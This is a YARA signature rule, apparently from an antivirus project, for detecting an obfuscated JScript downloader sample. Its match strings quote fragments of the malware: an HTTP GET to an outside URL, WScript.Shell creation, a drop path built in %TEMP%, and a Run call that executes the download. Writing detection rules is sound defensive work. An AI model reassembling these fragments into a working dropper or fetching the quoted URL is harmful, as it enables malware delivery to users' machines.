rule sig_20160427_413b5784750ac8dae72fd8e8d515ad65 {
  meta:
    description = "datamaliciousorder - file 20160427_413b5784750ac8dae72fd8e8d515ad65.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8ca74cc7e61941902033d145813fce6179d627d0791b362edd67e6762847de32"

  strings:
    $s1  = "IxqnyFoooc[NxtibDqapb](\"G\" + \"ET\", \"http://myehelpers.com/j3ykf\", false);" fullword ascii
    $s2  = "function PfxdwAvkkv() {return VaehyXdfcr[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"F1GxUVd" ascii
    $s3  = "function PfxdwAvkkv() {return VaehyXdfcr[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"F1GxUVd" ascii
    $s4  = "var VaehyXdfcr = function GmatuAidwd() {return QcjanKgndl[JtceeAzknm](\"WScript\"+\".Shell\");}(), HjgadLyjzu = 11;" fullword ascii
    $s5  = "function SojabKslyw(EreyiMfcur, MqrgvGsqfl){FmfmtPckeq = FmfmtPckeq * 1; return EreyiMfcur - MqrgvGsqfl;};" fullword ascii
    $s6  = "var QcjanKgndl = this[\"WScript\"];" fullword ascii
    $s7  = "if (IxqnyFoooc[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function XszxuJpktb(){return OylklDsyuf + \"\";};" fullword ascii
    $s9  = "function PqdetOwana() {return ((MbxiaYjyez == true) && (MbxiaYjyez == LrdwwEjajk)) ? 1 : FmfmtPckeq;};" fullword ascii
    $s10 = "function HsrbbIbqph()" fullword ascii
    $s11 = "LrdwwEjajk = true; " fullword ascii
    $s12 = "HmohkQtnee = true;" fullword ascii
    $s13 = "function TbkdkAopqr(){return 23;};" fullword ascii
    $s14 = "var LrdwwEjajk = false;" fullword ascii
    $s15 = "var ZxlcdLbrbq = new this[\"D\"+\"ate\"]();" fullword ascii
    $s16 = "function WhzfsNsdcs(){return JtceeAzknm;};" fullword ascii
    $s17 = "}while (XluleOfhib);" fullword ascii
    $s18 = "var HmohkQtnee = false;" fullword ascii
    $s19 = "function ZylpnKkgyt(DfrkcSgefs) {var OychtFirib = (1, 2, 3, 4, 5, DfrkcSgefs); return OychtFirib;};" fullword ascii
    $s20 = "function HmdcrNsrgz(OrxkdGqdem){VaehyXdfcr[\"R\"+\"un\"](OrxkdGqdem, FmfmtPckeq, FmfmtPckeq);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}